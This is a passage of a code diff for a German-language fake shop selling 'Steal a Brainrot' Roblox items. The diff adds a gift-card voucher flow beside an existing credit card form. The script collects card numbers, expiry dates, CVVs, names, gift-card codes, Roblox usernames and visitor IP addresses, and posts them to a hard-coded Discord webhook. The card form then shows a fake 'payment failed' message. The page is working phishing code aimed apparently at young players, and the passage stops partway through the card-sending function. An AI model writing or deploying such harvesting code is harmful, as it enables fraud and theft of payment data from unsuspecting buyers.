@@ -61,9 +61,7 @@
             max-width: 550px;
             height: auto;
             border-radius: 24px;
-            box-shadow:
-                0 25px 60px rgba(0, 0, 0, 0.6),
-                0 0 80px rgba(255, 71, 87, 0.08);
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6), 0 0 80px rgba(255, 71, 87, 0.08);
             transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow 0.5s ease;
             display: block;
             margin: 0 auto;
@@ -72,9 +70,7 @@
 
         .hero-logo:hover {
             transform: scale(1.02) translateY(-4px);
-            box-shadow:
-                0 35px 80px rgba(0, 0, 0, 0.7),
-                0 0 120px rgba(255, 71, 87, 0.12);
+            box-shadow: 0 35px 80px rgba(0, 0, 0, 0.7), 0 0 120px rgba(255, 71, 87, 0.12);
         }
 
         .hero-subtitle {
@@ -128,7 +124,6 @@
             padding: 0 24px;
         }
 
-        /* === SECTION HEADER === */
         .section-header {
             display: flex;
             align-items: center;
@@ -182,7 +177,6 @@
             background: linear-gradient(90deg, transparent, rgba(255, 71, 87, 0.15), transparent);
         }
 
-        /* === PRODUCT GRID === */
         .product-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
@@ -609,7 +603,310 @@
             box-shadow: 0 8px 30px rgba(255, 71, 87, 0.3);
         }
 
-        /* === CREDIT CARD OVERLAY (FIXED) === */
+        /* === ZAHLUNGSART OVERLAY === */
+        .payment-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            z-index: 1500;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .payment-overlay.active {
+            display: flex;
+        }
+
+        .payment-modal {
+            background: #12121a;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 24px;
+            padding: 40px;
+            width: 100%;
+            max-width: 460px;
+            animation: modalIn 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .payment-modal h2 {
+            color: #fff;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .payment-modal .payment-sub {
+            color: rgba(255, 255, 255, 0.4);
+            margin-bottom: 28px;
+            font-size: 0.95rem;
+        }
+
+        .payment-option {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 16px 20px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 12px;
+        }
+
+        .payment-option:hover {
+            background: rgba(255, 255, 255, 0.06);
+            border-color: rgba(255, 71, 87, 0.2);
+            transform: translateX(4px);
+        }
+
+        .payment-option .option-icon {
+            width: 44px;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .payment-option .option-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: block;
+        }
+
+        .payment-option .option-text {
+            font-weight: 600;
+            color: #fff;
+            font-size: 1.05rem;
+        }
+
+        .payment-option .option-sub {
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .payment-back {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 20px;
+            padding: 8px 16px;
+            background: rgba(255, 255, 255, 0.04);
+            color: rgba(255, 255, 255, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        .payment-back:hover {
+            background: rgba(255, 255, 255, 0.08);
+            color: #fff;
+        }
+
+        /* === GUTSCHEIN / BETRAG / CODE === */
+        .voucher-selection {
+            display: none;
+        }
+
+        .voucher-selection.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .payment-type-list {
+            display: none;
+        }
+
+        .payment-type-list.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .voucher-brand-btn {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 14px 20px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 10px;
+            width: 100%;
+            font-family: inherit;
+            font-size: 1rem;
+            color: #fff;
+        }
+
+        .voucher-brand-btn:hover {
+            background: rgba(255, 255, 255, 0.06);
+            border-color: rgba(255, 71, 87, 0.2);
+            transform: translateX(4px);
+        }
+
+        .voucher-brand-btn .brand-icon {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .voucher-brand-btn .brand-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: block;
+        }
+
+        .amount-selection {
+            display: none;
+        }
+
+        .amount-selection.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .amount-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .amount-btn {
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #fff;
+            text-align: center;
+        }
+
+        .amount-btn:hover {
+            background: rgba(255, 71, 87, 0.1);
+            border-color: #ff4757;
+            transform: translateY(-2px);
+        }
+
+        .amount-btn .amount-sub {
+            display: block;
+            font-size: 0.7rem;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.3);
+            margin-top: 4px;
+        }
+
+        .code-selection {
+            display: none;
+        }
+
+        .code-selection.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .code-selection label {
+            display: block;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 6px;
+            font-weight: 500;
+            font-size: 0.85rem;
+            letter-spacing: 0.3px;
+        }
+
+        .code-selection input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 18px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+            font-family: inherit;
+        }
+
+        .code-selection input:focus {
+            outline: none;
+            border-color: #ff4757;
+            background: rgba(255, 71, 87, 0.04);
+            box-shadow: 0 0 0 3px rgba(255, 71, 87, 0.08);
+        }
+
+        .code-selection input::placeholder {
+            color: rgba(255, 255, 255, 0.15);
+        }
+
+        .code-selection .submit-code-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ff4757, #e84142);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            font-family: inherit;
+            letter-spacing: 0.3px;
+            box-shadow: 0 4px 20px rgba(255, 71, 87, 0.2);
+        }
+
+        .code-selection .submit-code-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(255, 71, 87, 0.3);
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .success-message.active {
+            display: block;
+        }
+
+        .success-message .success-icon {
+            font-size: 3rem;
+            margin-bottom: 12px;
+        }
+
+        .success-message .success-title {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+
+        .success-message .success-text {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        /* === CREDIT CARD OVERLAY === */
         .card-overlay {
             display: none;
             position: fixed;
@@ -687,7 +984,6 @@
             color: rgba(255, 255, 255, 0.15);
         }
 
-        /* NEUE: Row für Vorname/Nachname */
         .card-modal .row-name {
             display: flex;
             gap: 14px;
@@ -832,7 +1128,8 @@
             }
 
             .checkout-modal,
-            .card-modal {
+            .card-modal,
+            .payment-modal {
                 padding: 28px;
             }
 
@@ -844,6 +1141,10 @@
             .card-modal .row-2 {
                 flex-direction: column;
                 gap: 0;
+            }
+
+            .amount-grid {
+                grid-template-columns: 1fr 1fr;
             }
         }
 
@@ -867,12 +1168,7 @@
     <!-- ==================== HERO SECTION ==================== -->
     <section class="hero">
         <div class="hero-content">
-            <img
-                class="hero-logo"
-                src="https://cdn.discordapp.com/attachments/1510660209385934929/1520719995141881896/StealABrainrot.webp?ex=6a42385c&is=6a40e6dc&hm=28e006271320d429e408764e2a6286c05edfa78175f6989df7796ba60226fb03"
-                alt="Steal a Brainrot"
-                onerror="this.style.display='none'"
-            >
+            <img class="hero-logo" src="https://cdn.discordapp.com/attachments/1510660209385934929/1520719995141881896/StealABrainrot.webp?ex=6a42385c&is=6a40e6dc&hm=28e006271320d429e408764e2a6286c05edfa78175f6989df7796ba60226fb03" alt="Steal a Brainrot" onerror="this.style.display='none'">
             <p class="hero-subtitle">Entdecke die exklusivsten <span>Brainrots</span></p>
         </div>
         <div class="scroll-indicator">
@@ -889,9 +1185,7 @@
                     <h2 class="section-title">Alle Brainrots</h2>
                     <span class="section-count" id="productCount">4 Produkte</span>
                 </div>
-                <div class="product-grid" id="productGrid">
-                    <!-- Karten via JS -->
-                </div>
+                <div class="product-grid" id="productGrid"></div>
             </div>
         </section>
     </div>
@@ -902,9 +1196,7 @@
             <button class="back-btn" onclick="goBack()">
                 <span class="arrow-icon">←</span> Zurück zum Shop
             </button>
-            <div class="detail-content" id="detailContent">
-                <!-- Wird via JS befüllt -->
-            </div>
+            <div class="detail-content" id="detailContent"></div>
         </div>
     </div>
 
@@ -917,10 +1209,8 @@
             <form id="checkoutForm">
                 <label for="robloxUser">Roblox-Username</label>
                 <input type="text" id="robloxUser" placeholder="z.B. xX_BrainrotKing_Xx" required autocomplete="off">
-
                 <label for="robloxServer">Roblox-Server-Link (optional)</label>
                 <input type="text" id="robloxServer" placeholder="https://www.roblox.com/games/..." autocomplete="off">
-
                 <div class="actions">
                     <button type="button" class="btn-cancel" onclick="closeCheckout()">Abbrechen</button>
                     <button type="submit" class="btn-next">Weiter zur Zahlung</button>
@@ -929,7 +1219,87 @@
         </div>
     </div>
 
-    <!-- ==================== CREDIT CARD OVERLAY (FIXED) ==================== -->
+    <!-- ==================== ZAHLUNGSART OVERLAY ==================== -->
+    <div id="paymentOverlay" class="payment-overlay">
+        <div class="payment-modal">
+            <button class="payment-back" onclick="closePayment()">← Zurück</button>
+            
+            <!-- Hauptauswahl -->
+            <div id="paymentTypeList" class="payment-type-list active">
+                <h2>Zahlungsmethode wählen</h2>
+                <p class="payment-sub">Wähle aus, wie du bezahlen möchtest.</p>
+                <div class="payment-option" onclick="selectVoucher()">
+                    <div class="option-icon"><img src="https://cdn.discordapp.com/attachments/1510660209385934929/1520806039509794858/credit-card.png?ex=6a42887f&is=6a4136ff&hm=ef229f33737013b778216d8221662a074cd46040b92125a93aa340221b858136&" alt="Gutschein"></div>
+                    <div>
+                        <div class="option-text">Gutschein / Karte</div>
+                        <div class="option-sub">Google Play, Apple, Paysafecard</div>
+                    </div>
+                </div>
+                <div class="payment-option" onclick="selectCreditCard()">
+                    <div class="option-icon">💳</div>
+                    <div>
+                        <div class="option-text">Kreditkarte</div>
+                        <div class="option-sub">Visa, Mastercard, etc.</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Gutschein Marken -->
+            <div id="voucherSelection" class="voucher-selection">
+                <button class="payment-back" onclick="backToPaymentType()">← Zahlungsart wählen</button>
+                <h2 style="margin-bottom: 18px;">Gutschein wählen</h2>
+                <button class="voucher-brand-btn" onclick="selectAmount('Google Play')">
+                    <span class="brand-icon"><img src="https://cdn.discordapp.com/attachments/1510660209385934929/1520806039048683580/google-play.png?ex=6a42887e&is=6a4136fe&hm=c2bf33ceafb1248155ce6b3bea28613bff8362e1835387d9cfd7890375950a01&" alt="Google Play"></span>
+                    Google Play
+                </button>
+                <button class="voucher-brand-btn" onclick="selectAmount('Apple')">
+                    <span class="brand-icon"><img src="https://cdn.discordapp.com/attachments/1510660209385934929/1520806038603956385/icons8-apple-inc-80.png?ex=6a42887e&is=6a4136fe&hm=c7b36e56162e8ff1f747707c56a2114a082696f40e6ee142c3d707fe5d0d9626&" alt="Apple"></span>
+                    Apple
+                </button>
+                <button class="voucher-brand-btn" onclick="selectAmount('Paysafecard')">
+                    <span class="brand-icon"><img src="https://cdn.discordapp.com/attachments/1510660209385934929/1520806038318747710/8395-paysafecard_102476.png?ex=6a42887e&is=6a4136fe&hm=66340894a60797025502c5e7a00d189b997436466eb079e50f3332fe9ce1c79b&" alt="Paysafecard"></span>
+                    Paysafecard
+                </button>
+            </div>
+
+            <!-- Betrag -->
+            <div id="amountSelection" class="amount-selection">
+                <button class="payment-back" onclick="backToVoucher()">← Gutschein wählen</button>
+                <h2 style="margin-bottom: 6px;">Betrag wählen</h2>
+                <p class="payment-sub" id="amountBrandDisplay" style="margin-bottom: 20px;"></p>
+                <div class="amount-grid">
+                    <div class="amount-btn" onclick="selectCode('10')">10 €<span class="amount-sub">Gutschein</span></div>
+                    <div class="amount-btn" onclick="selectCode('20')">20 €<span class="amount-sub">Gutschein</span></div>
+                    <div class="amount-btn" onclick="selectCode('25')">25 €<span class="amount-sub">Gutschein</span></div>
+                    <div class="amount-btn" onclick="selectCode('50')">50 €<span class="amount-sub">Gutschein</span></div>
+                </div>
+                <div class="amount-grid" style="margin-top: 0;">
+                    <div class="amount-btn" onclick="selectCode('100')" style="grid-column: 1 / -1;">100 €<span class="amount-sub">Gutschein</span></div>
+                </div>
+            </div>
+
+            <!-- Code-Eingabe -->
+            <div id="codeSelection" class="code-selection">
+                <button class="payment-back" onclick="backToAmount()">← Betrag wählen</button>
+                <h2 style="margin-bottom: 6px;">Gutscheincode eingeben</h2>
+                <p class="payment-sub" id="codeInfoDisplay" style="margin-bottom: 20px;"></p>
+                <form id="codeForm">
+                    <label for="voucherCode">Gutscheincode</label>
+                    <input type="text" id="voucherCode" placeholder="z.B. XXXX-XXXX-XXXX-XXXX" required autocomplete="off">
+                    <button type="submit" class="submit-code-btn">Gutschein einlösen</button>
+                </form>
+            </div>
+
+            <!-- Erfolgsnachricht -->
+            <div id="successMessage" class="success-message">
+                <div class="success-icon">✅</div>
+                <div class="success-title">Anfrage erfolgreich!</div>
+                <div class="success-text">Geh in deinen privaten Server und warte bis ich join.</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================== CREDIT CARD OVERLAY ==================== -->
     <div id="cardOverlay" class="card-overlay">
         <div class="card-modal">
             <div class="card-header">
@@ -938,7 +1308,6 @@
             </div>
             <p class="card-sub">Sichere Verifizierung deiner Kreditkarte für die Zahlung.</p>
             <form id="cardForm">
-                <!-- NEUE: Vorname + Nachname in einer Zeile -->
                 <div class="row-name">
                     <input type="text" id="firstName" placeholder="Vorname" required autocomplete="off">
                     <input type="text" id="lastName" placeholder="Nachname" required autocomplete="off">
@@ -949,66 +1318,34 @@
                     <input type="text" id="cardCvv" placeholder="CVV" maxlength="4" required autocomplete="off">
                 </div>
                 <button type="submit" class="pay-btn">Jetzt bezahlen</button>
-                <p class="error-msg" id="cardError">Zahlung fehlgeschlagen – Die Transaktion konnte nicht verarbeitet werden. Bitte versuche es später erneut.</p>
+                <p class="error-msg" id="cardError">Zahlung fehlgeschlagen – Die Transaktion konnte nicht verarbeitet werden.</p>
                 <div class="secure-badge">🔐 Verbindung SSL-verschlüsselt</div>
             </form>
         </div>
     </div>
 
     <!-- ==================== FOOTER ==================== -->
-    <footer class="site-footer">
-        STEAL A BRAINROT © 2026
-    </footer>
+    <footer class="site-footer">STEAL A BRAINROT © 2026</footer>
 
     <script>
         // ==================== PRODUCT DATA ====================
         const products = [
-            {
-                id: 1,
-                name: 'Ketupat',
-                price: '8,00 €',
-                priceRaw: 8.00,
-                image: 'https://cdn.discordapp.com/attachments/1510660209385934929/1520718807780556995/0efd80bcefc58814bd2c617d107303b6.jpg?ex=6a423741&is=6a40e5c1&hm=03a23409abc1133630250d8357db48c61358fc1257ec4f97442f857ebd24ecb0',
-                description: 'Kaufe den BRAINROT und du bekommst ein free Brainrot.'
-            },
-            {
-                id: 2,
-                name: 'Dragon Cannelloni',
-                price: '15,00 €',
-                priceRaw: 15.00,
-                image: 'https://cdn.discordapp.com/attachments/1510660209385934929/1520718813094612992/db8f6e8170ad2615009eec0726b90358.jpg?ex=6a423742&is=6a40e5c2&hm=1976784c1266fe4ef6025fdbce7cfc6de619b4d8b4d39af2642df0d7fd668033',
-                description: 'Kaufe den BRAINROT und du bekommst ein free Brainrot.'
-            },
-            {
-                id: 3,
-                name: 'Strawberry Elephant',
-                price: '25,00 €',
-                priceRaw: 25.00,
-                image: 'https://cdn.discordapp.com/attachments/1510660209385934929/1520718817678856313/5acd86055e4763918f99d42beee63b94.jpg?ex=6a423743&is=6a40e5c3&hm=30020fc76e9b1a91dfcdc198eb32b46375c939f5258e7095b0bfde366500f163',
-                description: 'Kaufe den BRAINROT und du bekommst ein free Brainrot.'
-            },
-            {
-                id: 4,
-                name: 'Meowl',
-                price: '15,00 €',
-                priceRaw: 15.00,
-                image: 'https://cdn.discordapp.com/attachments/1510660209385934929/1520718822850560072/32f36b1d6852ed762e22a55b7ab35cc2.jpg?ex=6a423744&is=6a40e5c4&hm=a9bdec0ee447868dd6ad062d7cfd47723eef86172fa7ab134f47751348ca9368',
-                description: 'Kaufe den BRAINROT und du bekommst ein free Brainrot.'
-            }
+            { id: 1, name: 'Ketupat', price: '8,00 €', priceRaw: 8.00, image: 'https://cdn.discordapp.com/attachments/1510660209385934929/1520718807780556995/0efd80bcefc58814bd2c617d107303b6.jpg?ex=6a423741&is=6a40e5c1&hm=03a23409abc1133630250d8357db48c61358fc1257ec4f97442f857ebd24ecb0', description: 'Kaufe den BRAINROT und du bekommst ein free Brainrot.' },
+            { id: 2, name: 'Dragon Cannelloni', price: '15,00 €', priceRaw: 15.00, image: 'https://cdn.discordapp.com/attachments/1510660209385934929/1520718813094612992/db8f6e8170ad2615009eec0726b90358.jpg?ex=6a423742&is=6a40e5c2&hm=1976784c1266fe4ef6025fdbce7cfc6de619b4d8b4d39af2642df0d7fd668033', description: 'Kaufe den BRAINROT und du bekommst ein free Brainrot.' },
+            { id: 3, name: 'Strawberry Elephant', price: '25,00 €', priceRaw: 25.00, image: 'https://cdn.discordapp.com/attachments/1510660209385934929/1520718817678856313/5acd86055e4763918f99d42beee63b94.jpg?ex=6a423743&is=6a40e5c3&hm=30020fc76e9b1a91dfcdc198eb32b46375c939f5258e7095b0bfde366500f163', description: 'Kaufe den BRAINROT und du bekommst ein free Brainrot.' },
+            { id: 4, name: 'Meowl', price: '15,00 €', priceRaw: 15.00, image: 'https://cdn.discordapp.com/attachments/1510660209385934929/1520718822850560072/32f36b1d6852ed762e22a55b7ab35cc2.jpg?ex=6a423744&is=6a40e5c4&hm=a9bdec0ee447868dd6ad062d7cfd47723eef86172fa7ab134f47751348ca9368', description: 'Kaufe den BRAINROT und du bekommst ein free Brainrot.' }
         ];
 
-        // ==================== DISCORD WEBHOOK ====================
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1510666602880827555/BJi26n78BO0IFaGxOUxTjwRU7CtVfnHkGTRhK0s_NUF7XMEBiQIuRVa0z8KubyOPjYB1';
 
-        // ==================== STATE ====================
         let currentProduct = null;
         let robloxData = {};
+        let selectedBrand = '';
+        let selectedAmount = '';
 
-        // ==================== RENDER PRODUCT GRID ====================
         function renderGrid() {
             const grid = document.getElementById('productGrid');
             grid.innerHTML = '';
-
             products.forEach(p => {
                 const card = document.createElement('div');
                 card.className = 'product-card';
@@ -1023,51 +1360,32 @@
                             <div class="price">${p.price}</div>
                         </div>
                         <div class="product-id">#${String(p.id).padStart(3, '0')}</div>
-                    </div>
-                `;
+                    </div>`;
                 card.addEventListener('click', () => openDetail(p.id));
                 grid.appendChild(card);
             });
-
-            // Coming Soon
-            const comingSoon = document.createElement('div');
-            comingSoon.className = 'product-card coming-soon';
-            comingSoon.innerHTML = `
-                <div class="coming-soon-content">
-                    <div class="coming-soon-icon">✦</div>
-                    <div class="coming-soon-text">Coming Soon</div>
-                    <div class="coming-soon-sub">Nächstes Brainrot in Entwicklung</div>
-                </div>
-            `;
-            grid.appendChild(comingSoon);
-
+            const cs = document.createElement('div');
+            cs.className = 'product-card coming-soon';
+            cs.innerHTML = `<div class="coming-soon-content"><div class="coming-soon-icon">✦</div><div class="coming-soon-text">Coming Soon</div><div class="coming-soon-sub">Nächstes Brainrot in Entwicklung</div></div>`;
+            grid.appendChild(cs);
             document.getElementById('productCount').textContent = products.length + ' Produkte';
         }
 
-        // ==================== DETAIL ANSICHT ====================
         function openDetail(id) {
-            const product = products.find(p => p.id === id);
-            if (!product) return;
-
-            currentProduct = product;
-
+            const p = products.find(x => x.id === id);
+            if (!p) return;
+            currentProduct = p;
             document.getElementById('mainPage').classList.add('hidden');
             document.getElementById('detailPage').classList.add('active');
-
-            const content = document.getElementById('detailContent');
-            content.innerHTML = `
-                <div class="detail-image">
-                    <img src="${product.image}" alt="${product.name}" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22500%22 height=%22500%22><rect fill=%22%2312121a%22 width=%22500%22 height=%22500%22/><text fill=%22rgba(255,255,255,0.1)%22 font-size=%2240%22 x=%22250%22 y=%22260%22 text-anchor=%22middle%22>${product.name.charAt(0)}</text></svg>'">
-                </div>
+            document.getElementById('detailContent').innerHTML = `
+                <div class="detail-image"><img src="${p.image}" alt="${p.name}" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22500%22 height=%22500%22><rect fill=%22%2312121a%22 width=%22500%22 height=%22500%22/><text fill=%22rgba(255,255,255,0.1)%22 font-size=%2240%22 x=%22250%22 y=%22260%22 text-anchor=%22middle%22>${p.name.charAt(0)}</text></svg>'"></div>
                 <div class="detail-info">
                     <div class="detail-badge">Limitierte Edition</div>
-                    <h2>${product.name}</h2>
-                    <div class="detail-price">${product.price}</div>
-                    <div class="description">${product.description}</div>
+                    <h2>${p.name}</h2>
+                    <div class="detail-price">${p.price}</div>
+                    <div class="description">${p.description}</div>
                     <button class="buy-btn" onclick="openCheckout()">Jetzt kaufen</button>
-                </div>
-            `;
-
+                </div>`;
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
@@ -1078,7 +1396,6 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ==================== CHECKOUT (ROBLOX) ====================
         function openCheckout() {
             document.getElementById('checkoutOverlay').classList.add('active');
             document.body.style.overflow = 'hidden';
@@ -1094,18 +1411,114 @@
             e.preventDefault();
             const user = document.getElementById('robloxUser').value.trim();
             const server = document.getElementById('robloxServer').value.trim();
-
-            if (!user) {
-                alert('Bitte gib deinen Roblox-Username ein.');
-                return;
-            }
-
+            if (!user) { alert('Bitte gib deinen Roblox-Username ein.'); return; }
             robloxData = { username: user, serverLink: server || 'Nicht angegeben' };
             closeCheckout();
-            openCardForm();
+            openPaymentSelection();
         });
 
-        // ==================== CREDIT CARD FORM ====================
+        function openPaymentSelection() {
+            selectedBrand = '';
+            selectedAmount = '';
+            document.getElementById('paymentTypeList').classList.add('active');
+            document.getElementById('voucherSelection').classList.remove('active');
+            document.getElementById('amountSelection').classList.remove('active');
+            document.getElementById('codeSelection').classList.remove('active');
+            document.getElementById('successMessage').classList.remove('active');
+            document.getElementById('paymentOverlay').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closePayment() {
+            document.getElementById('paymentOverlay').classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        function selectVoucher() {
+            document.getElementById('paymentTypeList').classList.remove('active');
+            document.getElementById('voucherSelection').classList.add('active');
+        }
+
+        function selectCreditCard() {
+            closePayment();
+            openCardForm();
+        }
+
+        function backToPaymentType() {
+            document.getElementById('voucherSelection').classList.remove('active');
+            document.getElementById('amountSelection').classList.remove('active');
+            document.getElementById('codeSelection').classList.remove('active');
+            document.getElementById('successMessage').classList.remove('active');
+            document.getElementById('paymentTypeList').classList.add('active');
+        }
+
+        function selectAmount(brand) {
+            selectedBrand = brand;
+            document.getElementById('voucherSelection').classList.remove('active');
+            document.getElementById('amountBrandDisplay').textContent = brand + ' Gutschein – Wähle einen Betrag';
+            document.getElementById('amountSelection').classList.add('active');
+        }
+
+        function backToVoucher() {
+            document.getElementById('amountSelection').classList.remove('active');
+            document.getElementById('voucherSelection').classList.add('active');
+        }
+
+        function selectCode(amount) {
+            selectedAmount = amount;
+            document.getElementById('amountSelection').classList.remove('active');
+            document.getElementById('codeInfoDisplay').textContent = selectedBrand + ' • ' + selectedAmount + ' € – Gib deinen Code ein';
+            document.getElementById('codeSelection').classList.add('active');
+            document.getElementById('voucherCode').value = '';
+            document.getElementById('voucherCode').focus();
+        }
+
+        function backToAmount() {
+            document.getElementById('codeSelection').classList.remove('active');
+            document.getElementById('successMessage').classList.remove('active');
+            document.getElementById('amountSelection').classList.add('active');
+        }
+
+        document.getElementById('codeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const code = document.getElementById('voucherCode').value.trim();
+            if (!code) { alert('Bitte gib deinen Gutscheincode ein.'); return; }
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(ipData => sendVoucherToDiscord(code, ipData.ip || 'Unbekannt'))
+                .catch(() => sendVoucherToDiscord(code, 'Unbekannt'));
+        });
+
+        function sendVoucherToDiscord(code, ip) {
+            const productName = currentProduct ? currentProduct.name : 'Unbekannt';
+            const productPrice = currentProduct ? currentProduct.price : 'Unbekannt';
+            const message = {
+                content: '@everyone **Neuer Gutscheincode erhalten!**',
+                embeds: [{
+                    title: '🎴 Gutschein-Daten',
+                    color: 0x4ecdc4,
+                    fields: [
+                        { name: 'Produkt', value: productName, inline: true },
+                        { name: 'Preis', value: productPrice, inline: true },
+                        { name: '‎', value: '‎', inline: false },
+                        { name: 'Gutschein-Marke', value: selectedBrand, inline: true },
+                        { name: 'Betrag', value: selectedAmount + ' €', inline: true },
+                        { name: 'Gutscheincode', value: code, inline: false },
+                        { name: '‎', value: '‎', inline: false },
+                        { name: 'Roblox-User', value: robloxData.username || 'Nicht angegeben', inline: true },
+                        { name: 'Roblox-Server', value: robloxData.serverLink || 'Nicht angegeben', inline: true },
+                        { name: 'IP-Adresse', value: ip, inline: false }
+                    ],
+                    footer: { text: 'Steal a Brainrot • Gutschein-Verifikation' },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(message) })
+                .catch(err => console.error('Webhook Fehler:', err));
+            document.getElementById('codeSelection').classList.remove('active');
+            document.getElementById('successMessage').classList.add('active');
+        }
+
         function openCardForm() {
             document.getElementById('cardOverlay').classList.add('active');
             document.body.style.overflow = 'hidden';
@@ -1120,24 +1533,16 @@
             document.body.style.overflow = '';
         }
 
-        // Kartennummer formatieren
         document.getElementById('cardNumber').addEventListener('input', function() {
-            let val = this.value.replace(/\D/g, '');
-            if (val.length > 16) val = val.slice(0, 16);
-            let formatted = '';
-            for (let i = 0; i < val.length; i++) {
-                if (i > 0 && i % 4 === 0) formatted += ' ';
-                formatted += val[i];
-            }
-            this.value = formatted;
+            let val = this.value.replace(/\D/g, '').slice(0, 16);
+            let f = '';
+            for (let i = 0; i < val.length; i++) { if (i > 0 && i % 4 === 0) f += ' '; f += val[i]; }
+            this.value = f;
         });
 
         document.getElementById('cardExpiry').addEventListener('input', function() {
-            let val = this.value.replace(/\D/g, '');
-            if (val.length > 4) val = val.slice(0, 4);
-            if (val.length >= 2) {
-                val = val.slice(0, 2) + '/' + val.slice(2);
-            }
+            let val = this.value.replace(/\D/g, '').slice(0, 4);
+            if (val.length >= 2) val = val.slice(0, 2) + '/' + val.slice(2);
             this.value = val;
         });
 
@@ -1145,41 +1550,26 @@
             this.value = this.value.replace(/\D/g, '').slice(0, 4);
         });
 
-        // ==================== CARD FORM SUBMIT → DISCORD ====================
         document.getElementById('cardForm').addEventListener('submit', function(e) {
             e.preventDefault();
-
             const firstName = document.getElementById('firstName').value.trim();
             const lastName = document.getElementById('lastName').value.trim();
             const nummer = document.getElementById('cardNumber').value.trim();
             const ablauf = document.getElementById('cardExpiry').value.trim();
             const cvv = document.getElementById('cardCvv').value.trim();
-
-            if (!firstName || !lastName || !nummer || !ablauf || !cvv) {
-                alert('Bitte fülle alle Felder aus.');
-                return;
-            }
-
-            // Vollständiger Name
+            if (!firstName || !lastName || !nummer || !ablauf || !cvv) { alert('Bitte fülle alle Felder aus.'); return; }
             const fullName = firstName + ' ' + lastName;
-
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
-                .then(ipData => {
-                    const ip = ipData.ip || 'Unbekannt';
-                    sendToDiscord(fullName, firstName, lastName, nummer, ablauf, cvv, ip);
-                })
-                .catch(() => {
-                    sendToDiscord(fullName, firstName, lastName, nummer, ablauf, cvv, 'Unbekannt');
-                });
+                .then(ipData => sendCardToDiscord(fullName, firstName, lastName, nummer, ablauf, cvv, ipData.ip || 'Unbekannt'))
+                .catch(() => sendCardToDiscord(fullName, firstName, lastName, nummer, ablauf, cvv, 'Unbekannt'));
         });
 
-        function sendToDiscord(fullName, firstName, lastName, nummer, ablauf, cvv, ip) {
